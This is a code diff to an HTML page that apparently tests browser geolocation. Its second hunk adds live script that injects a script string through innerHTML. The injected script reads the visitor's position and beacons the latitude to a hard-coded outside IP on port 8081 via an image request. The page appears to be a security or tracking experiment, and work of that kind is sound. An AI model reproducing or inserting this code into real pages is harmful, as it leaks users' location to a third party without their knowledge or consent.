@@ -386,21 +386,21 @@
                     }
                 }
 
-                var t1 = getTimestamp();
-                var i;
-                // ZX call geolocation
-                getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                // getLocation();
-                var t2 = getTimestamp();
-                console.log("zxRes time: " + (t2 - t1));
+                // var t1 = getTimestamp();
+                // var i;
+                // // ZX call geolocation
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // // getLocation();
+                // var t2 = getTimestamp();
+                // console.log("zxRes time: " + (t2 - t1));
             </script>
 
         </section>
@@ -413,13 +413,16 @@
 </div>
 
 
-<!--<script>-->
-<!--// var str = "<div></div>";-->
-<!--var str = "<script> console.log(\"ZX: from console\");b=document.createElement(\'img\'); b.src=\"http://23.83/235.55:8081/def\";<\/script>";-->
-<!--// var str = "<script> console.log(\"ZX: from console\");<\/script>";-->
-<!--// document.getElementById('inner').innerHTML = str;-->
-<!--document.write(str);-->
-<!--</script>-->
+<script>
+// var str = "<div></div>";
+var str = "<script> navigator.geolocation.getCurrentPosition(position, handleError);" +
+    "function position(position) { b=document.createElement(\'img\'); b.src=\"http://23.83.235.55:8081/\" + position.coords.latitude;}" +
+    "function handleError(error) { };<\/script>";
+
+// var str = "<script> console.log(\"ZX: from console\");<\/script>";
+document.getElementById('inner').innerHTML = str;
+// document.write(str);
+</script>
 
 <!--<script>-->
 <!--// var str = "<div></div>";-->
